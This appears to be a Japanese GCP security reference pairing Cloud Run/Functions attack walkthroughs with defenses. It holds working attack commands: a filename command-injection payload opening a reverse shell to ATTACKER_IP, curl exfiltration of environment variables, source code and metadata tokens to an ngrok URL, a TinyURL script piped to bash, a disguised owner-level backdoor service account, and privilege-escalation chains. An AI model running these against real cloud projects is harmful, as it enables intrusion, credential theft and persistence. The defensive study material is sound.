# GCPコンピュートセキュリティリファレンス

Cloud Run/Cloud Functionsのセキュリティ脅威と対策パターンをまとめたリファレンス。イベントトリガーの悪用、バックドア設定、権限昇格の攻撃・防御パターンを記述。

---

## GCPコンピュートセキュリティ概要

### 主要な脅威

- **イベントトリガーの悪用**: Cloud Storageイベントを起点としたコードインジェクション攻撃
- **リバースシェル取得**: 悪意あるファイル名によるコマンド実行
- **環境変数・ソースコード・資格情報の窃取**: メタデータエンドポイントを経由した情報漏洩
- **バックドア設定**: サービスアカウントキー生成による永続化
- **権限昇格**: 過剰な権限を持つサービスアカウントの悪用

### 脆弱性が発生する条件

- ユーザー入力（ファイル名等）を検証せずにシェルコマンドに直接渡す
- サービスアカウントに `roles/owner` や `roles/editor` 等の過剰な権限を付与
- タイムアウト設定が長すぎる（20分等）→ リバースシェルセッション確立の余地
- 環境変数に秘密情報を直接格納（`SECRET=PASSWORD123`等）

---

## 2. イベントトリガーの悪用（Chapter 9）

### 2.1 攻撃シナリオ: Cloud Storageイベントトリガーによるコードインジェクション

1. 攻撃者が悪意あるファイル名（コマンドインジェクションペイロード）を持つファイルをアップロード
2. Cloud Run/Functionsがイベントをトリガーし、ファイル名を検証せずに処理
3. `subprocess.run(f"wkhtmltopdf {filename} ...", shell=True)` のようなコードでコマンド実行
4. リバースシェルが確立され、攻撃者が対話的にコマンド実行可能

### 2.2 脆弱なコード例（コマンドインジェクション）

以下はCloud Storageイベントから受け取ったファイル名を直接シェルに渡すPythonコードの例。

```python
import os
import subprocess
from flask import Flask, request
import functions_framework

app = Flask(__name__)

@functions_framework.cloud_event
def process_upload(cloud_event):
    bucket = cloud_event.data["bucket"]
    filename = cloud_event.data["name"]  # ユーザーが制御可能

    # ❌ 脆弱: ファイル名を検証せずにシェルコマンドに渡す
    output_filename = filename.replace(".html", ".pdf")
    cmd = f"wkhtmltopdf /tmp/{filename} /tmp/{output_filename}"
    subprocess.run(cmd, shell=True)  # shell=True + f-string = インジェクション脆弱性

    # ファイル名に "; malicious_command #" が含まれると任意コマンドが実行される
```

攻撃ペイロードとなるファイル名の例:
```
index.html; bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1 #.html
```

### 2.3 攻撃パターン

#### リバースシェルペイロード生成（攻撃者VM）

```bash
# リバースシェルリスナー起動
nc -lvnp 4444

# 攻撃者のVM IPアドレスを変数に格納
RECEIVER_IP="XX.XX.XX.XX"

# リバースシェルコマンド構築
COMMAND="bash -i >& /dev/tcp/$RECEIVER_IP/4444 0>&1"

# Base64エンコード（特殊文字対策）
ENCODED=$(echo "bash -c '$COMMAND'" | base64 -w0)

# 悪意あるファイル名構築
FILENAME="index.html; echo $ENCODED | base64 -d | bash #.html"

# ファイル作成・アップロード
touch -- "$FILENAME"
gsutil cp -- "$FILENAME" gs://$INPUT_BUCKET/
```

#### リバースシェル確立後の情報窃取

```bash
# 現在のユーザー確認
whoami  # → root

# 環境変数一覧（秘密情報含む）
env
# 出力例:
# SECRET=PASSWORD123
# CLOUD_RUN_TIMEOUT_SECONDS=1200
# OUTPUT_BUCKET=ss-output-bucket-...

# メタデータエンドポイントからサービスアカウント情報取得
MD_URL="http://169.254.169.254/computeMetadata/v1"
curl -H "Metadata-Flavor: Google" "$MD_URL/instance/service-accounts/default/email"
# → html-to-pdf@PROJECT_ID.iam.gserviceaccount.com

# アクセストークン取得
ACCESS_TOKEN=$(gcloud auth print-access-token)

# サービスアカウント権限確認
gcloud projects get-iam-policy $PROJECT_ID \
  --flatten="bindings[].members" \
  --format='table(bindings.role)' \
  --filter="bindings.members:$SERVICE_ACCOUNT_EMAIL"
# → roles/owner（過剰な権限）

# Cloud Storage バケット一覧
gcloud storage buckets list --format="value(name)"

# バケット内の機密ファイルダウンロード
gsutil cp gs://$BUCKET_NAME/data.csv .
cat data.csv
# → 個人情報（PII）の漏洩
```

### 2.3 Parameter Manager パラメータの窃取

```bash
# Parameter Manager パラメータ一覧
gcloud parametermanager parameters list \
  --location=global \
  --format="value(name)"

# パラメータバージョン一覧
PARAM_NAME=$(gcloud parametermanager parameters list \
  --location=global --limit=1 --format="value(name)")

gcloud parametermanager parameters versions list \
  --location=global \
  --parameter=$PARAM_NAME

# パラメータデータ取得（デコード）
VERSION_NAME=$(gcloud parametermanager parameters versions list \
  --location=global --parameter=$PARAM_NAME --limit=1 --format="value(name)")

PARAM_DATA=$(gcloud parametermanager parameters versions describe $VERSION_NAME \
  --location=global --format="value(payload.data)")

echo $PARAM_DATA | base64 -d
# 出力例（旧バージョンに残った資格情報）:
# database:
#   username: admin
#   password: password12345
```

### 2.4 防御策

#### 入力検証（必須）

```python
import os
import subprocess
from pathlib import Path

# ❌ 脆弱なコード
subprocess.run(f"wkhtmltopdf {filename} output.pdf", shell=True)

# ✅ 安全なコード
# 1. ファイル名の検証（許可リスト方式）
safe_filename = Path(filename).name
if not safe_filename.endswith(('.html', '.htm')):
    raise ValueError("Invalid file extension")

# 2. shell=False + 引数リスト形式
subprocess.run(
    ["wkhtmltopdf", safe_filename, "output.pdf"],
    check=True,
    shell=False  # シェル経由での実行を禁止
)
```

#### サービスアカウント権限の最小化

```bash
# 現在の権限削除
gcloud projects remove-iam-policy-binding $PROJECT_ID \
  --member="serviceAccount:$SA_EMAIL" \
  --role="roles/owner"

# 必要最小限の権限のみ付与
gcloud projects add-iam-policy-binding $PROJECT_ID \
  --member="serviceAccount:$SA_EMAIL" \
  --role="roles/storage.objectViewer"

gcloud projects add-iam-policy-binding $PROJECT_ID \
  --member="serviceAccount:$SA_EMAIL" \
  --role="roles/storage.objectCreator"
```

#### タイムアウト短縮による防御（リバースシェルセッション制限）

タイムアウトを短縮することでリバースシェルセッションの継続時間を制限できる。ただし、タイムアウト短縮だけでは完全な防御にならない点に注意が必要。攻撃者はngrokやTinyURL等のリバースシェル不要の手法で回避できるため、入力検証や egress 制限と組み合わせることが重要。

```bash
# 段階的にタイムアウトを短縮する手順
# ステップ1: まず現在のタイムアウト設定を確認
RUN_SERVICE=$(gcloud run services list --format="value(name)" | head -1)
RUN_REGION=$(gcloud run services list --format="value(region)" | head -1)

gcloud run services describe $RUN_SERVICE \
  --region=$RUN_REGION \
  --format="value(spec.template.spec.timeoutSeconds)"
# → 1200（デフォルト20分）

# ステップ2: 2分に短縮してリバースシェルの継続を困難に
gcloud run services update $RUN_SERVICE \
  --region=$RUN_REGION \
  --timeout=120

# ステップ3: さらに10秒に短縮（リバースシェル確立をほぼ不可能に）
gcloud run services update $RUN_SERVICE \
  --region=$RUN_REGION \
  --timeout=10

# タイムアウト設定の確認
gcloud run services describe $RUN_SERVICE \
  --region=$RUN_REGION \
  --format="value(spec.template.spec.timeoutSeconds)"
# → 10
```

**重要**: タイムアウト10秒でもngrok/TinyURLを使った非リバースシェル型攻撃は防げない。egress制限（VPC Connector + `--vpc-egress=all-traffic`）との組み合わせが必須。

#### 秘密情報の管理

```bash
# ❌ 環境変数に直接格納
gcloud run deploy $SERVICE_NAME \
  --set-env-vars SECRET=PASSWORD123

# ✅ Secret Managerを使用
gcloud secrets create db-password --data-file=-
gcloud run deploy $SERVICE_NAME \
  --update-secrets=DB_PASSWORD=db-password:latest
```

---

## 3. バックドアと権限昇格（Chapter 10）

### 3.1 攻撃シナリオ: サービスアカウントキー生成による永続化

1. 侵害されたCloud Runサービスからメタデータエンドポイント経由でアクセストークン取得
2. トークンを使ってサービスアカウントキーを生成
3. キーをエクスフィルトレーション（外部送信）
4. 攻撃者がキーを使って継続的にアクセス可能（バックドア完成）

### 3.2 攻撃パターン

#### サービスアカウントキー生成

```bash
# リバースシェル内でキー生成
SA_EMAIL=$(curl -s -H "Metadata-Flavor: Google" \
  "$MD_URL/instance/service-accounts/default/email")

gcloud iam service-accounts keys create /tmp/sa-key.json \
  --iam-account=$SA_EMAIL

# キーの内容確認
cat /tmp/sa-key.json
# → JSON形式のサービスアカウントキー
```

#### キーを使った認証（攻撃者環境）

```bash
# 攻撃者がキーをローカルに保存
# sa-key.json をCloud Shellにコピー

# サービスアカウントとしてログイン
gcloud auth activate-service-account --key-file=sa-key.json

PROJECT_ID=$(cat sa-key.json | jq -r ".project_id")
gcloud config set project $PROJECT_ID

# プロジェクトリソースへのアクセス確認
gcloud projects list
gcloud storage buckets list
```

#### バックドアサービスアカウント設定

攻撃者は正規のインフラ運用名に擬態したService Account名を使って永続アクセスを確保する。代表的な偽装名は `system-update-agent`、`backup-service`、`monitoring-task`、`infra-maintenance` 等。

```bash
# 正規のオペレーション名を装ったサービスアカウント作成（偽装の典型例）
# 命名パターン: <動詞>-<役割> 形式で正規インフラと区別しにくくする
gcloud iam service-accounts create system-update-agent \
  --description="Handles routine system updates" \
  --display-name="System Update Agent"

# owner権限付与（過剰な権限）
gcloud projects add-iam-policy-binding $PROJECT_ID \
  --member="serviceAccount:system-update-agent@$PROJECT_ID.iam.gserviceaccount.com" \
  --role="roles/owner"

# キー生成（攻撃者が外部から使用するための認証情報）
gcloud iam service-accounts keys create ~/sys-update-key.json \
  --iam-account=system-update-agent@$PROJECT_ID.iam.gserviceaccount.com
```

#### バックドアService Account の検知方法

```bash
# 方法1: 作成日時が最近のService Accountを抽出（異常な作成は侵害の兆候）
gcloud iam service-accounts list \
  --project=$PROJECT_ID \
  --format="table(email, displayName, oauth2ClientId)"

# 方法2: 期待するSAリスト（baseline）と比較して予期しないSAを検出
EXPECTED_SAS=("html-to-pdf" "app-backend" "data-pipeline")
gcloud iam service-accounts list \
  --project=$PROJECT_ID \
  --format="value(email)" | while read SA_EMAIL; do
  SA_NAME=$(echo $SA_EMAIL | cut -d@ -f1)
  if [[ ! " ${EXPECTED_SAS[@]} " =~ " ${SA_NAME} " ]]; then
    echo "[WARNING] 未知のService Account検出: $SA_EMAIL"
  fi
done

# 方法3: Cloud Auditログでバックドア作成イベントを検索
gcloud logging read \
  'protoPayload.methodName="google.iam.admin.v1.CreateServiceAccount"' \
  --project=$PROJECT_ID \
  --limit=50 \
  --format="table(timestamp, protoPayload.authenticationInfo.principalEmail, protoPayload.request.serviceAccount.displayName)"

# 方法4: owner/editor権限を持つ予期しないSAを検出
gcloud projects get-iam-policy $PROJECT_ID \
  --flatten="bindings[].members" \
  --filter="bindings.role:(roles/owner OR roles/editor) AND bindings.members:serviceAccount" \
  --format="table(bindings.members, bindings.role)"
```

### 3.3 リバースシェル不要の攻撃パターン（タイムアウト10秒対策）

#### ngrokトンネルを使ったエクスフィルトレーション

```bash
# 攻撃者のローカルマシンでngrokトンネル起動
ngrok http 8000
# → https://<ID>.ngrok-free.app

# 環境変数をngrok経由で送信
NGROK_URL="https://<ID>.ngrok-free.app"
COMMAND="env | curl -X POST --data-binary @- $NGROK_URL"
ENCODED=$(echo "bash -c '$COMMAND'" | base64 -w0)
FILENAME="index.html; echo $ENCODED | base64 -d | bash #.html"

touch -- "$FILENAME"
gsutil cp -- "$FILENAME" gs://$INPUT_BUCKET/
```

#### ソースコード送信

```bash
# アプリケーションコード送信
COMMAND="curl -X POST --data-binary @main.py $NGROK_URL"
ENCODED=$(echo "bash -c '$COMMAND'" | base64 -w0)
FILENAME="index.html; echo $ENCODED | base64 -d | bash #.html"

touch -- "$FILENAME"
gsutil cp -- "$FILENAME" gs://$INPUT_BUCKET/
```

#### アクセストークン窃取（TinyURL経由）

```bash
# Gistにスクリプト保存
# send.sh:
#!/bin/bash
NGROK_URL="https://<ID>.ngrok-free.app"
TOKEN_URL="http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token"
curl -s -H "Metadata-Flavor: Google" $TOKEN_URL \
  | curl -X POST --data-binary @- $NGROK_URL

# TinyURLで短縮
# https://gist.githubusercontent.com/USER/GIST_ID/raw/HASH/send.sh
# → https://tinyurl.com/ALIAS

# ファイル名に短縮URL埋め込み
SHORT_URL="https://tinyurl.com/ALIAS"
RAW_COMMAND="curl -sL $SHORT_URL | bash"
ENCODED=$(echo "$RAW_COMMAND" | base64 -w0)
FILENAME="index.html; echo $ENCODED | base64 -d | bash #.html"

touch -- "$FILENAME"
gsutil cp -- "$FILENAME" gs://$INPUT_BUCKET/
```

#### アクセストークンを使ったAPI呼び出し

```bash
# トークン受信後、攻撃者環境で使用
ACCESS_TOKEN="ya29...."

# プロジェクト一覧
curl -H "Authorization: Bearer $ACCESS_TOKEN" \
  https://cloudresourcemanager.googleapis.com/v1/projects

# Cloud Storage バケット一覧
curl -s -H "Authorization: Bearer $ACCESS_TOKEN" \
  "https://storage.googleapis.com/storage/v1/b?project=$PROJECT_NUMBER"

# サービスアカウントキー生成
BASE_URL="https://iam.googleapis.com/v1"
curl -s -X POST \
  -H "Authorization: Bearer $ACCESS_TOKEN" \
  -H "Content-Type: application/json" \
  "$BASE_URL/projects/$PROJECT_ID/serviceAccounts/$SA_EMAIL/keys" \
  -d '{}' \
  | jq -r '.privateKeyData' | base64 --decode > run-key.json
```

### 3.4 権限昇格パターン

#### Cloud Run Admin権限による権限昇格チェーン

`roles/run.admin` と `roles/iam.serviceAccountUser` の組み合わせは、直接の impersonation 権限がなくても権限昇格を可能にする。攻撃者は悪意あるCloud Runサービス・Functionをデプロイし、高権限SAのトークンをメタデータサーバーから取得する。

**昇格チェーン**: `html-to-pdf SA`（roles/editor + roles/run.admin + roles/iam.serviceAccountUser）→ `superadmin SA`（roles/owner）

```bash
# ステップ1: 現在のSAの権限を確認
gcloud projects get-iam-policy $PROJECT_ID \
  --flatten="bindings[].members" \
  --format='table(bindings.role)' \
  --filter="bindings.members:html-to-pdf@$PROJECT_ID.iam.gserviceaccount.com"
# → roles/editor, roles/iam.serviceAccountUser, roles/run.admin

# ステップ2: 高権限SAのメールを特定
SUPERADMIN_EMAIL=$(gcloud iam service-accounts list \
  --format="value(email)" | grep superadmin)

# ステップ3: 悪意あるCloud Runサービスをデプロイ（superadmin SAをアタッチ）
#   このサービスはメタデータサーバーからsuperadmin SAのトークンを返す
gcloud run deploy token-provider \
  --image=gcr.io/cloudrun/hello \
  --region=us-east1 \
  --service-account=$SUPERADMIN_EMAIL \
  --no-allow-unauthenticated

# ステップ4: デプロイしたサービスのURLを取得
FUNCTION_URL=$(gcloud run services describe token-provider \
  --region=us-east1 \
  --format="value(status.url)")

# ステップ5: 認証トークンでリクエスト送信 → superadmin SAのアクセストークン取得
IDENTITY_TOKEN=$(gcloud auth print-identity-token)
SUPERADMIN_TOKEN=$(curl -s -H "Authorization: Bearer $IDENTITY_TOKEN" $FUNCTION_URL \
  | jq -r '.access_token')

# ステップ6: 取得したトークンでsuperadmin SAとして操作
# → roles/ownerの全権限を行使可能
curl -s -X POST \
  -H "Authorization: Bearer $SUPERADMIN_TOKEN" \
  -H "Content-Type: application/json" \
  "https://iam.googleapis.com/v1/projects/$PROJECT_ID/serviceAccounts/$SUPERADMIN_EMAIL/keys" \
  -d '{}' \
  | jq -r '.privateKeyData' | base64 --decode > superadmin-key.json
```

#### Compute Engine VMインスタンスを経由した横移動と権限昇格

Cloud Run SAが `roles/compute.instanceAdmin` を持つ場合、Compute Engine VMに高権限SAをアタッチして起動し、SSHでVMに接続してトークンを窃取できる。

```bash
# 前提: html-to-pdf SAがroles/iam.serviceAccountUser + compute操作権限を持つ場合

# ステップ1: 高権限SAをアタッチしたVMを起動（攻撃者がCloud Runから実行）
gcloud compute instances create token-vm \
  --zone=us-east1-b \
  --machine-type=e2-micro \
  --image-family=debian-12 \
  --image-project=debian-cloud \
  --service-account=$SUPERADMIN_EMAIL \
  --scopes=https://www.googleapis.com/auth/cloud-platform

# ステップ2: SSHでVMに接続
gcloud compute ssh token-vm --zone=us-east1-b

# ステップ3: VM内でメタデータサーバーからsuperadmin SAのトークンを取得
MD_URL="http://169.254.169.254/computeMetadata/v1"

# アタッチされたSAメールを確認
curl -s -H "Metadata-Flavor: Google" \
  "$MD_URL/instance/service-accounts/default/email"
# → superadmin@PROJECT_ID.iam.gserviceaccount.com

# アクセストークン取得
curl -s -H "Metadata-Flavor: Google" \
  "$MD_URL/instance/service-accounts/default/token"
# → {"access_token":"ya29....","expires_in":3599,"token_type":"Bearer"}

# ステップ4: SSHを終了し、取得したトークンで外部から操作
exit
```

**Cloud RunとCompute Engine横移動の比較**:
| 手法 | 必要な権限 | 検知難易度 |
|------|-----------|----------|
| Cloud Run Function経由 | roles/run.admin + roles/iam.serviceAccountUser | 中（新規Functionデプロイで検知可能） |
| Compute Engine VM経由 | roles/compute.instanceAdmin + roles/iam.serviceAccountUser | 中（新規VM作成で検知可能） |
| 直接impersonation | roles/iam.serviceAccountTokenCreator | 低（明示的なAPIコール） |

### 3.5 防御策

#### サービスアカウントキーの管理

```bash
# サービスアカウントキー一覧
gcloud iam service-accounts keys list \
  --iam-account=$SA_EMAIL

# 不要なキー削除
gcloud iam service-accounts keys delete $KEY_ID \
  --iam-account=$SA_EMAIL

# キー作成の監視（Cloud Logging）
gcloud logging read \
  'protoPayload.methodName="google.iam.admin.v1.CreateServiceAccountKey"'
```

#### IAM権限の定期監査

```bash
# 全サービスアカウントの権限確認
for SA in $(gcloud iam service-accounts list --format="value(email)"); do
  echo "=== $SA ==="
  gcloud projects get-iam-policy $PROJECT_ID \
    --flatten="bindings[].members" \
    --format='table(bindings.role)' \
    --filter="bindings.members:serviceAccount:$SA"
done

# owner/editor権限を持つサービスアカウント検出
gcloud projects get-iam-policy $PROJECT_ID \
  --flatten="bindings[].members" \
  --filter="bindings.role:(roles/owner OR roles/editor) AND bindings.members:serviceAccount"
```

#### ネットワーク制御（egress制限）

```yaml
# Cloud Run サービスにVPCコネクタをアタッチし、egress制御
gcloud run services update $SERVICE_NAME \
  --region=$REGION \
  --vpc-connector=$VPC_CONNECTOR \
  --vpc-egress=private-ranges-only

# ファイアウォールルールで外部への通信を制限
gcloud compute firewall-rules create deny-egress \
  --direction=EGRESS \
  --action=DENY \
  --rules=all \
  --priority=1000 \
  --network=$NETWORK
```

---

## 4. GCPサーバーレスセキュリティチェックリスト

### 4.1 コード実装

- [ ] ユーザー入力の検証（ファイル名・パラメータ等）
- [ ] `subprocess.run(shell=False)` 使用（シェルインジェクション対策）
- [ ] 環境変数に秘密情報を格納しない（Secret Manager使用）
- [ ] パラメータマネージャーに資格情報を直接保存しない（Secret Manager参照）

### 4.2 サービスアカウント

- [ ] 最小権限の原則（roles/owner, roles/editor禁止）
- [ ] 各リソースに専用サービスアカウント割り当て
- [ ] サービスアカウントキーの定期ローテーション
- [ ] キー作成イベントの監視・アラート設定
- [ ] `roles/run.admin` + `roles/iam.serviceAccountUser` の組み合わせを持つSAを監査（権限昇格リスク）
- [ ] 新規SA作成時のアラート設定（バックドアSA検知）

### 4.3 Cloud Run/Functions設定

- [ ] タイムアウト設定の最小化（10-30秒推奨）
- [ ] 認証必須（`--no-allow-unauthenticated`）
- [ ] VPC Connector使用 + egress制限（`--vpc-egress=all-traffic`）
- [ ] `max-instances` 設定（リソース枯渇対策）
- [ ] 未知の新規Serviceデプロイの監視（権限昇格に悪用される可能性）

### 4.4 監視・ログ

- [ ] Cloud Loggingでコマンド実行ログ監視
- [ ] 外部への異常な通信パターン検出（DNS・HTTPエグレス）
- [ ] メタデータエンドポイントアクセスログ確認
- [ ] サービスアカウントキー作成イベント監視
- [ ] 新規Service Account作成イベント監視（バックドアSA検知）
- [ ] 新規Cloud Run/Functions/Compute Engine起動イベント監視（権限昇格経路の検知）

```bash
# 権限昇格に悪用される可能性のある操作を監視するCloud Loggingクエリ

# 1. バックドアSA作成の検知
gcloud logging read \
  'protoPayload.methodName="google.iam.admin.v1.CreateServiceAccount"' \
  --project=$PROJECT_ID \
  --limit=20

# 2. 不審なCloud Run/Functionsデプロイの検知
gcloud logging read \
  'protoPayload.methodName=~"google.cloud.run.v1.Services.CreateService|google.cloud.functions.v1.CloudFunctionsService.CreateFunction"' \
  --project=$PROJECT_ID \
  --limit=20

# 3. 新規VMインスタンス作成の検知
gcloud logging read \
  'protoPayload.methodName="v1.compute.instances.insert"' \
  --project=$PROJECT_ID \
  --limit=20

# 4. DNS外部通信（エグレス）の異常検知
# VPC Flow LogsをBigQueryにエクスポートし、未知のIPへの通信パターンを分析
```

### 4.5 定期監査

```bash
# 週次/月次で実行
# 1. 全サービスアカウントのIAM権限確認
for SA in $(gcloud iam service-accounts list --format="value(email)"); do
  gcloud projects get-iam-policy $PROJECT_ID \
    --flatten="bindings[].members" \
    --filter="bindings.members:serviceAccount:$SA"
done

# 2. 不要なサービスアカウント削除
gcloud iam service-accounts list

# 3. 古いサービスアカウントキー削除
gcloud iam service-accounts keys list --iam-account=$SA_EMAIL

# 4. 未使用のCloud Run/Functionsリソース削除
gcloud run services list
gcloud functions list

# 5. 高リスク権限の組み合わせを持つSAを検出
# roles/run.admin + roles/iam.serviceAccountUser = 権限昇格リスク
gcloud projects get-iam-policy $PROJECT_ID --format=json \
  | python3 -c "
import json, sys
policy = json.load(sys.stdin)
sa_roles = {}
for binding in policy.get('bindings', []):
    role = binding['role']
    for member in binding.get('members', []):
        if member.startswith('serviceAccount:'):
            sa_roles.setdefault(member, []).append(role)
ESCALATION_COMBOS = [
    {'roles/run.admin', 'roles/iam.serviceAccountUser'},
    {'roles/compute.instanceAdmin.v1', 'roles/iam.serviceAccountUser'},
]
for sa, roles in sa_roles.items():
    role_set = set(roles)
    for combo in ESCALATION_COMBOS:
        if combo.issubset(role_set):
            print(f'[RISK] {sa}: {roles}')
"
```

---

## まとめ

- **イベントトリガーの悪用**: ファイル名等のユーザー入力をシェルコマンドに渡さない
- **脆弱なコードパターン**: `subprocess.run(shell=True)` + ユーザー入力 = コマンドインジェクション
- **リバースシェル対策**: タイムアウト短縮 + egress制限 + 入力検証（タイムアウト短縮だけでは不十分）
- **ngrok/TinyURL回避**: リバースシェル不要の攻撃に対してはegress制限とDNS監視が必須
- **資格情報窃取対策**: 環境変数に秘密情報を保存しない、Secret Manager使用
- **バックドアSA対策**: 正規名に擬態したSAに注意。作成イベント監視 + baselineとの差分検知
- **Cloud Run Admin権限昇格**: `roles/run.admin` + `roles/iam.serviceAccountUser` の組み合わせは権限昇格リスク
- **Compute Engine横移動**: VMへの高権限SAアタッチによるトークン窃取に注意
- **権限昇格対策**: 最小権限の原則、owner/editor権限の排除、高リスク権限組み合わせの監査
- **継続的監視**: Cloud Loggingでキー作成・SA作成・新規デプロイ・外部通信・メタデータアクセスを監視
